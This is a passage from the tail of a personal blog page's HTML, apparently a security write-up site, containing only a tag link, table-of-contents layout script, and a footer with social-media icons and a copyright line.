                <a href="https://chovid99.github.io/tags/2022">2022</a>
            
        </div>
    
    
    
  <div id="comment">
    
    
  </div>


</section>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="/js/tocbot.min.js"></script>

<script type="text/javascript">
  tocbot.init({
      
      tocSelector: '.js-toc',
      
      contentSelector: '.js-toc-content',
      headingSelector: 'h1, h2, h3',
      orderedList: false,
      headingLabelCallback: s => s.substr(0, s.length-2),
      collapseDepth: 2
  });
  function initTOC() {
    var windowWidth = 1316;
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
  }
  window.onload = initTOC;

  var lastWindowWidth = $(window).width();
  $(window).resize(function() {
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
    lastWindowWidth = $(window).width();
  });
</script>

    </main>
    
    <footer id="footer">
    
        <div id="social">


    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>Github</title>
    <desc>Created with Sketch.</desc>
    <defs></defs>
    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
            <g id="Github" transform="translate(264.000000, 939.000000)">
                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
            </g>
        </g>
    </g>
</svg>
    </a>

    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
	 xml:space="preserve">
<g>
	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
</g>
</svg>

    </a>


</div>

    

    <div class="copyright">
    
       ¬© Copyright 
       2023 
       <span class="split">
        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
</svg>
       </span>
       Chovid99
    
    </div>

    
</footer>



  </body>
</html>
